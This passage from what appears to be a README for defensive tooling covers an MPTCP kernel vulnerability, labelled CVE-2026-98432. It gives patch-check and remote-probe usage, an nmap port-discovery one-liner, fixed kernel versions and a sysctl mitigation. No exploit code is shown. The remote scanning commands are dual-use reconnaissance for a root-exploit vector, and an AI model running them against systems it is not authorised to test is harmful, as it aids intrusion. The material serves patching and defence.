Exit codes: `0` patched, `1` vulnerable, `2` needs reboot or manual check.

### Remote MPTCP probe (run from any Linux box with kernel ≥ 5.6)

Single host, known ports:

```sh
python3 probe-mptcp.py <HOST> <PORT> [PORT ...]
python3 probe-mptcp.py 192.168.1.1 22 443 5060
```

Single host, auto-discover all open TCP ports with nmap:

```sh
python3 probe-mptcp.py <HOST> $(nmap -Pn --open -p- <HOST> -oG - | grep -oP '\d+/open/tcp' | cut -d/ -f1 | tr '\n' ' ')
```

> Replace **both** `<HOST>` with the target IP.

Multiple hosts:

```sh
chmod +x scan-and-probe.sh
./scan-and-probe.sh <HOST1> <HOST2> <HOST3>
```

## What the tools check

### check-cve-2026-98432.sh

1. Queries the vendor changelog for the CVE (authoritative on Debian/Ubuntu/RHEL).
2. Falls back to comparing `uname -r` against the first fixed version per stable branch.
3. Flags pending reboots (patched kernel installed but not booted).
4. Reports MPTCP state (`net.mptcp.enabled` and active MPTCP listeners).

### probe-mptcp.py

Opens a standard MPTCP-requesting TCP connection and checks whether the server negotiated MPTCP or fell back to plain TCP.

- `PLAIN-TCP` — server did not negotiate MPTCP; demonstrated root-exploit vector absent.
- `MPTCP-ACTIVE` — server negotiated MPTCP; exposure vector present.
- `CLOSED` — port filtered or refused.

**Safe:** no IP options, no resend/race, no exploit trigger. It is a normal TCP handshake with the MPTCP capability flag.

**Limitation:** PLAIN-TCP does not mean patched. It means the demonstrated vector is closed. The underlying race exists in plain IPv4 TCP — only the kernel version confirms the fix.

## Fixed kernel versions

| Branch | First fixed |
|--------|------------|
| 5.10.x | 5.10.272 |
| 5.15.x | 5.15.223 |
| 6.1.x  | 6.1.190 |
| 6.6.x  | 6.6.159 |
| 6.12.x | 6.12.113 |
| 6.18.x | 6.18.56 |
| 7.2.x  | 7.2.10 |
| 7.3+   | Fixed at release |

## Immediate mitigation (if patching is not yet possible)

```sh
sysctl -w net.mptcp.enabled=0
echo 'net.mptcp.enabled=0' > /etc/sysctl.d/90-disable-mptcp.conf
sysctl --system
```

This disables MPTCP kernel-wide, closing the demonstrated root-exploit path. No reboot required; persists across reboots. Most services never use MPTCP, so functional impact is nil.
